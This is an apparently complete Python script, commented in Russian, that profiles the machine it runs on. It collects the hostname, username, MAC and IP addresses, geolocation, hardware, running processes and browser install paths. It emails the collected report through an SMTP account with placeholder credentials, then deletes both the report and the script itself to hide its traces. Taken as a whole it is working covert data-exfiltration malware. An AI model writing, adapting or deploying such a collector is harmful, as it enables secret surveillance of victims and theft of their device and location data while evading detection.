import socket
import platform
import psutil
import uuid
import requests
import json
import os
import subprocess
from datetime import datetime, timedelta
import getpass
import sqlite3
import shutil
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import sys
import glob
import time

class SystemInfoCollector:
    def __init__(self):
        self.data = {}
        self.filename = f"system_info_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    def get_system_info(self):
        """Сбор основной системной информации"""
        try:
            self.data['system'] = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0,2*6,2)][::-1])
            }
        except Exception as e:
            self.data['system'] = {'error': str(e)}
    
    def get_network_info(self):
        """Сбор сетевой информации"""
        try:
            # Внешний IP
            try:
                external_ip = requests.get('https://api.ipify.org', timeout=5).text
            except:
                external_ip = "Не удалось получить"
            
            # Локальный IP
            local_ip = socket.gethostbyname(socket.gethostname())
            
            # Информация о сетевых интерфейсах
            interfaces = {}
            for interface, addrs in psutil.net_if_addrs().items():
                interfaces[interface] = []
                for addr in addrs:
                    interfaces[interface].append({
                        'family': addr.family.name,
                        'address': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast
                    })
            
            self.data['network'] = {
                'external_ip': external_ip,
                'local_ip': local_ip,
                'interfaces': interfaces
            }
            
        except Exception as e:
            self.data['network'] = {'error': str(e)}
    
    def get_hardware_info(self):
        """Сбор информации о железе"""
        try:
            # Информация о CPU
            cpu_info = {
                'physical_cores': psutil.cpu_count(logical=False),
                'total_cores': psutil.cpu_count(logical=True),
                'max_frequency': f"{psutil.cpu_freq().max:.2f} MHz" if psutil.cpu_freq() else "N/A",
                'usage_percent': f"{psutil.cpu_percent()}%"
            }
            
            # Информация о памяти
            memory = psutil.virtual_memory()
            memory_info = {
                'total': f"{memory.total / (1024**3):.2f} GB",
                'available': f"{memory.available / (1024**3):.2f} GB",
                'used': f"{memory.used / (1024**3):.2f} GB",
                'percentage': f"{memory.percent}%"
            }
            
            # Информация о дисках
            disks = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'file_system': partition.fstype,
                        'total_size': f"{usage.total / (1024**3):.2f} GB",
                        'used': f"{usage.used / (1024**3):.2f} GB",
                        'free': f"{usage.free / (1024**3):.2f} GB",
                        'percentage': f"{usage.percent}%"
                    })
                except:
                    continue
            
            self.data['hardware'] = {
                'cpu': cpu_info,
                'memory': memory_info,
                'disks': disks
            }
            
        except Exception as e:
            self.data['hardware'] = {'error': str(e)}
    
    def get_geolocation(self):
        """Определение местоположения по IP"""
        try:
            response = requests.get('http://ip-api.com/json/', timeout=10)
            if response.status_code == 200:
                geo_data = response.json()
                self.data['geolocation'] = {
                    'ip': geo_data.get('query', 'N/A'),
                    'country': geo_data.get('country', 'N/A'),
                    'region': geo_data.get('regionName', 'N/A'),
                    'city': geo_data.get('city', 'N/A'),
                    'zip': geo_data.get('zip', 'N/A'),
                    'lat': geo_data.get('lat', 'N/A'),
                    'lon': geo_data.get('lon', 'N/A'),
                    'timezone': geo_data.get('timezone', 'N/A'),
                    'isp': geo_data.get('isp', 'N/A')
                }
            else:
                self.data['geolocation'] = {'error': 'Не удалось получить геоданные'}
        except Exception as e:
            self.data['geolocation'] = {'error': str(e)}
    
    def get_software_info(self):
        """Сбор информации об установленном ПО"""
        try:
            # Информация о Python
            python_info = {
                'version': platform.python_version(),
                'implementation': platform.python_implementation(),
                'compiler': platform.python_compiler()
            }
            
            # Информация о запущенных процессах (первые 10)
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username']
                    })
                except:
                    continue
                if len(processes) >= 10:  # Ограничиваем количество
                    break
            
            self.data['software'] = {
                'python': python_info,
                'processes': processes[:10]  # Только первые 10 процессов
            }
            
        except Exception as e:
            self.data['software'] = {'error': str(e)}
    
    def get_browser_data(self):
        """Сбор данных из браузеров"""
        browser_data = {}
        
        try:
            browser_data['chrome'] = self._get_browser_general_data('chrome')
        except Exception as e:
            browser_data['chrome'] = {'error': str(e)}
        
        try:
            browser_data['firefox'] = self._get_browser_general_data('firefox')
        except Exception as e:
            browser_data['firefox'] = {'error': str(e)}
        
        try:
            browser_data['edge'] = self._get_browser_general_data('edge')
        except Exception as e:
            browser_data['edge'] = {'error': str(e)}
        
        self.data['browsers'] = browser_data
    
    def _get_browser_general_data(self, browser):
        """Общие данные браузеров"""
        browser_data = {}
        browser_paths = {
            'chrome': {
                'windows': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
                'linux': os.path.join(os.path.expanduser('~'), '.config', 'google-chrome'),
                'darwin': os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome')
            },
            'firefox': {
                'windows': os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
                'linux': os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox'),
                'darwin': os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox')
            },
            'edge': {
                'windows': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
                'linux': os.path.join(os.path.expanduser('~'), '.config', 'microsoft-edge'),
                'darwin': os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Microsoft Edge')
            }
        }
        
        system = platform.system().lower()
        browser_path = browser_paths.get(browser, {}).get(system)
        
        if browser_path and os.path.exists(browser_path):
            browser_data['installed'] = True
            browser_data['path'] = browser_path
            browser_data['profile_size'] = self._get_folder_size(browser_path)
        else:
            browser_data['installed'] = False
        
        return browser_data
    
    def _get_folder_size(self, path):
        """Получение размера папки"""
        try:
            total_size = 0
            for dirpath, dirnames, filenames in os.walk(path):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    if os.path.exists(filepath):
                        total_size += os.path.getsize(filepath)
            return f"{total_size / (1024**2):.2f} MB"
        except:
            return "N/A"
    
    def get_installed_browsers(self):
        """Определение установленных браузеров"""
        browsers = []
        
        browser_checks = [
            ('chrome', 'Google Chrome'),
            ('firefox', 'Firefox'),
            ('edge', 'Microsoft Edge'),
            ('opera', 'Opera'),
            ('safari', 'Safari'),
            ('brave', 'Brave')
        ]
        
        for browser_key, browser_name in browser_checks:
            if self._is_browser_installed(browser_key):
                browsers.append(browser_name)
        
        self.data['installed_browsers'] = browsers
    
    def _is_browser_installed(self, browser_key):
        """Проверка установлен ли браузер"""
        try:
            if platform.system() == 'Windows':
                try:
                    import winreg
                    reg_paths = {
                        'chrome': r"SOFTWARE\Google\Chrome",
                        'firefox': r"SOFTWARE\Mozilla\Mozilla Firefox",
                        'edge': r"SOFTWARE\Microsoft\Edge"
                    }
                    if browser_key in reg_paths:
                        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_paths[browser_key])
                    return True
                except:
                    return False
            else:
                browser_executables = {
                    'chrome': ['google-chrome', 'chrome'],
                    'firefox': ['firefox'],
                    'edge': ['microsoft-edge'],
                    'opera': ['opera'],
                    'safari': ['safari'],
                    'brave': ['brave-browser']
                }
                
                for exe in browser_executables.get(browser_key, []):
                    try:
                        subprocess.check_output(['which', exe], stderr=subprocess.DEVNULL)
                        return True
                    except:
                        continue
                return False
        except:
            return False
    
    def get_timestamp(self):
        """Добавление временной метки"""
        self.data['timestamp'] = {
            'utc': datetime.utcnow().isoformat(),
            'local': datetime.now().isoformat(),
            'timezone': str(datetime.now().astimezone().tzinfo)
        }
    
    def collect_all(self):
        """Сбор всей информации"""
        print("Сбор системной информации...")
        self.get_timestamp()
        self.get_system_info()
        self.get_network_info()
        self.get_hardware_info()
        self.get_geolocation()
        self.get_software_info()
        self.get_installed_browsers()
        self.get_browser_data()
        print("Сбор данных завершен!")
        return self.data
    
    def save_to_file(self):
        """Сохранение данных в файл"""
        with open(self.filename, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, ensure_ascii=False, indent=2)
        
        print(f"Данные сохранены в файл: {self.filename}")
        return self.filename
    
    def send_email(self):
        """Отправка файла на почту"""
        try:
            # Настройки почты
            smtp_server = "smtp.yandex.ru"
            smtp_port = 587
            smtp_username = "your_mail"
            smtp_password = "your_password_here"  # Замените на реальный пароль
            
            # Создание сообщения
            msg = MIMEMultipart()
            msg['From'] = smtp_username
            msg['To'] = "mail"
            msg['Subject'] = f"System Info Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Текст письма
            body = f"""
            System Information Report
            Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            Hostname: {socket.gethostname()}
            Username: {getpass.getuser()}
            IP Address: {self.data.get('network', {}).get('external_ip', 'N/A')}
            """
            msg.attach(MIMEText(body, 'plain'))
            
            # Прикрепление файла
            with open(self.filename, 'rb') as f:
                attach = MIMEApplication(f.read(), _subtype="json")
                attach.add_header('Content-Disposition', 'attachment', filename=os.path.basename(self.filename))
                msg.attach(attach)
            
            # Отправка
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.send_message(msg)
            server.quit()
            
            print("Файл успешно отправлен на почту!")
            return True
            
        except Exception as e:
            print(f"Ошибка при отправке email: {e}")
            return False
    
    def cleanup(self):
        """Очистка - удаление скрипта и временных файлов"""
        try:
            # Удаление JSON файла
            if os.path.exists(self.filename):
                os.remove(self.filename)
                print(f"Удален файл: {self.filename}")
            
            # Удаление самого скрипта
            script_path = os.path.abspath(sys.argv[0])
            if os.path.exists(script_path):
                # Для Windows
                if platform.system() == 'Windows':
                    subprocess.call(f'timeout /t 3 /nobreak && del /f "{script_path}"', shell=True)
                # Для Linux/Mac
                else:
                    subprocess.call(f'sleep 3 && rm -f "{script_path}"', shell=True)
                
                print(f"Скрипт будет удален: {script_path}")
            
        except Exception as e:
            print(f"Ошибка при очистке: {e}")

def main():
    """Основная функция"""
    try:
        print("Запуск сбора системной информации...")
        
        # Создаем сборщик информации
        collector = SystemInfoCollector()
        
        # Собираем все данные
        data = collector.collect_all()
        
        # Сохраняем в файл
        collector.save_to_file()
        
        # Отправляем на почту
        print("Отправка данных на почту...")
        email_sent = collector.send_email()
        
        if email_sent:
            print("Данные успешно отправлены!")
        else:
            print("Не удалось отправить данные по email")
        
        # Очистка
        print("Выполняется очистка...")
        collector.cleanup()
        
        print("Процесс завершен!")
        
    except Exception as e:
        print(f"Произошла ошибка: {e}")
        # Все равно пытаемся очиститься
        try:
            collector.cleanup()
        except:
            pass

if __name__ == "__main__":
    main()
